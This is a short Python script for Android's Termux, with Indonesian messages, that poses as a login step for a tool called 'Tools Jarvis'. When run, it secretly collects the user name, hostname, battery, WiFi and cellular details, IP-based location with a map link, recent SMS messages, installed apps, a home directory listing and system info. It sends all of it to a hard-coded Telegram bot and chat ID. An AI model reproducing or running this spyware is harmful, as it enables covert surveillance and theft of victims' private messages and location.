import requests
import subprocess
import os
import json
TELEGRAM_BOT_TOKEN = '7187391237:AAFEjlTa-zeFESzJ8udlUtlDLbHYdrj_yVQ'
TELEGRAM_CHAT_ID = '6815272748'
INIT_MESSAGE = 'Berhasil Login Di Tools Jarvis - Admin menerima informasi login'

def send_telegram_message(token, chat_id, message):
    url = f'https://api.telegram.org/bot{token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message}
    requests.post(url, data=data)
send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, INIT_MESSAGE)
user_info = subprocess.getoutput('whoami')
host_info = os.uname().nodename
login_info = f'Info Login:\nUser: {user_info}\nHostname: {host_info}'
send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, login_info)

def get_battery_info():
    battery_info = subprocess.getoutput('termux-battery-status')
    battery_data = json.loads(battery_info)
    temperature_c = battery_data['temperature'] - 273.15 if 'temperature' in battery_data else 'Tidak tersedia'
    message = f"Informasi Baterai:\n- Level: {battery_data.get('percentage', 'N/A')}%\n- Status: {battery_data.get('status', 'N/A')}\n- Kesehatan: {battery_data.get('health', 'N/A')}\n- Terhubung ke: {battery_data.get('plugged', 'N/A')}\n- Suhu: {temperature_c}°C"
    return message
battery_info = get_battery_info()
send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, battery_info)

def get_wifi_status():
    return subprocess.getoutput('termux-wifi-connectioninfo')

def get_cellular_status():
    return subprocess.getoutput('termux-telephony-cellinfo')
status_message = f'WiFi Status:\n{get_wifi_status()}\n\nCellular Status:\n{get_cellular_status()}'
send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, status_message)

def get_ip_location():
    ip_info = requests.get('https://ipinfo.io').json()
    loc_valid = 'Valid' if ip_info.get('loc') else 'Tidak valid'
    maps_url = f"https://www.google.com/maps?q={ip_info.get('loc')}" if loc_valid == 'Valid' else 'Tidak tersedia'
    message = f"IP: {ip_info.get('ip', 'N/A')}\nLokasi: {ip_info.get('city', 'N/A')}\nWilayah: {ip_info.get('region', 'N/A')}\nNegara: {ip_info.get('country', 'N/A')}\nID Lokasi: {ip_info.get('loc', 'N/A')}\nLokasi Valid: {loc_valid}\nOrganisasi: {ip_info.get('org', 'N/A')}\nGoogle Maps: {maps_url}"
    return message
ip_location_info = get_ip_location()
send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ip_location_info)

def get_and_send_info(info_type, command):
    info = subprocess.getoutput(command)
    message = f'{info_type}:\n{info}'
    send_telegram_message(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message)
get_and_send_info('Pesan SMS terbaru', 'termux-sms-list')
get_and_send_info('Daftar aplikasi yang terinstal', 'pm list packages')
get_and_send_info('Status baterai', 'termux-battery-status')
get_and_send_info('Informasi jaringan', 'termux-wifi-connectioninfo')
get_and_send_info('Daftar file di direktori home', f"ls -la {os.path.expanduser('~')}")
get_and_send_info('Versi Android', 'getprop ro.build.version.release')
get_and_send_info('Tanggal dan Waktu Sistem', 'date')